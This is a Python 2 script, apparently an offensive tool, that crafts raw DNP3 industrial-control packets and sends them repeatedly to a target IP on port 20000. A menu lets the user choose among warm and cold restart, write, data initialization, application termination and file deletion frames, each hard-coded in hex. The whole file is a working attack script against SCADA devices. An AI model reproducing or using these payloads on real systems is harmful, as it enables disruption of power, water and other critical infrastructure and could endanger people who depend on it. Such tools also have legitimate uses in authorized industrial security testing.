#! /usr/bin/env python

############################################################################
#
#	This program is free software; you can redistribute it and/or modify
#  	it under the terms of the GNU General Public License as published by
#  	the Free Software Foundation; either version 2, or (at your option)
#  	any later version.
#
#	Program to DNP3 attack traffic through specific IP address
#
#	Author: Fernando Burrieza Galan
#
#	Version: 1.2
#
#	Since: 21/03/2022
#
###########################################################################

'''DNP3A ttacks Crafter'''

import sys
import socket
import time

if __name__ == "__main__":
    
    print "                                                                                                   "
    print "    ____  _   ______ _____    ___   __  __             __      ______           ______             "
    print "   / __ \/ | / / __ \__  /   /   | / /_/ /_____ ______/ /__   / ____/________ _/ __/ /____  _____  "
    print "  / / / /  |/ / /_/ //_ <   / /| |/ __/ __/ __ `/ ___/ //_/  / /   / ___/ __ `/ /_/ __/ _ \/ ___/  "
    print " / /_/ / /|  / ____/__/ /  / ___ / /_/ /_/ /_/ / /__/ ,<    / /___/ /  / /_/ / __/ /_/  __/ /      "
    print "/_____/_/ |_/_/   /____/  /_/  |_\__/\__/\__,_/\___/_/|_|   \____/_/   \__,_/_/  \__/\___/_/\n     "

    # Main Program
    if len(sys.argv) != 2:
        print '\nMissing arguments!'
        print 'Format: ./DNP3AttackCrafter.py dst-ip'
        print 'Exiting...'
        print ''
        print '     Example:     ./DNP3AttackCrafter 192.168.1.1'
        print ''
        quit()

    ipdst = sys.argv[1] # IP Destination
    destport= 20000     # DNP3 standard port

    ''' Open default python socket with our target.'''

    mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mysocket.connect((ipdst,destport))

    ''' Options selector '''

    print 'Choose one action to perform:'
    print '1: Health check'
    print '2: Warm Restart attack'
    print '3: Cold Restart attack'
    print '4: Write attack'
    print '5: Initialize data attack'
    print '6: App function termination attack'
    print '7: Delete file attack'
    print ''

    attack_type = int(raw_input())

    print 'Choose number of repetitions:'

    attack_count = int(raw_input())
    
    ''' Create custom DNP3 packet using HEX code'''

    if attack_type == 1:
        dnp3="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21" 

    if attack_type == 2:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0e\x6c\xd1" 

    if attack_type == 3:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0d\x8E\x8B" 

    if attack_type == 4:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x02\x9d\xf7" 

    if attack_type == 5:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0f\x32\xe7" 

    if attack_type == 6:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x12\xf6\x45" 

    if attack_type == 7:
        dnp3="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x1b\x21\x8c" 

    ''' Perform selected attack '''

    i = 0
    packet=dnp3
    print ''

    while (i < attack_count): 
        mysocket.send(packet)
        i=i+1
        time.sleep(0.02) #Time lapse between packets (in seconds)
        print 'Sent' , i , 'repetitions...'

    print 'Finished.\n'
    mysocket.close()

